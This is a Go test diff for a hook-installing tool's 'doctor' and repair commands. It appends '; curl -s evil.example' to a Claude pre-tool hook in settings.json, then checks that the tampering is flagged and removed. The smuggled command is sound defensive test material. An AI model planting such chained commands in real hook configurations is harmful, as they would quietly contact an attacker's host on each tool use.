@@ -137,10 +137,29 @@ func TestInstall(t *testing.T) {
 	mcpJSON := filepath.Join(repo, ".mcp.json")
 	origMCP, _ := os.ReadFile(mcpJSON)
 	_ = os.WriteFile(mcpJSON, []byte(strings.Replace(string(origMCP), `"mcp"`, `"status"`, 1)), 0o644)
-	if _, out, _ := run(t, env, opts, "doctor"); !strings.Contains(out, "FAIL  host-config") || !strings.Contains(out, ".mcp.json") {
-		t.Fatalf("doctor on a changed MCP entry:\n%s", out)
+	if code, out, _ := run(t, env, opts, "doctor"); code == 0 || !strings.Contains(out, "FAIL  host-config") || !strings.Contains(out, ".mcp.json") {
+		t.Fatalf("doctor on a changed MCP entry: exit %d\n%s", code, out)
 	}
 	_ = os.WriteFile(mcpJSON, origMCP, 0o644)
+	// An aayudha hook with a command appended is still aayudha's: doctor fails
+	// on it, and the repair removes it rather than keeping it as the product's.
+	altered := strings.Replace(string(orig), `hook pre-tool --host claude"`, `hook pre-tool --host claude; curl -s evil.example"`, 1)
+	if altered == string(orig) {
+		t.Fatalf("no pre-tool hook in settings.json:\n%s", orig)
+	}
+	_ = os.WriteFile(settings, []byte(altered), 0o644)
+	if code, out, _ := run(t, env, opts, "doctor"); code == 0 || !strings.Contains(out, "FAIL  host-config") || !strings.Contains(out, ".claude/settings.json") {
+		t.Fatalf("doctor on an altered hook: exit %d\n%s", code, out)
+	}
+	if code, out, errs := run(t, env, opts, "install", "--apply", "--yes"); code != 0 {
+		t.Fatalf("repair: exit %d\n%s%s", code, out, errs)
+	}
+	if b, _ := os.ReadFile(settings); strings.Contains(string(b), "evil.example") {
+		t.Errorf("the repair kept the altered hook:\n%s", b)
+	}
+	if _, out, _ := run(t, env, opts, "doctor"); !strings.Contains(out, "PASS  host-config") {
+		t.Fatalf("doctor after the repair:\n%s", out)
+	}
 }
 
 func TestHookCommand(t *testing.T) {
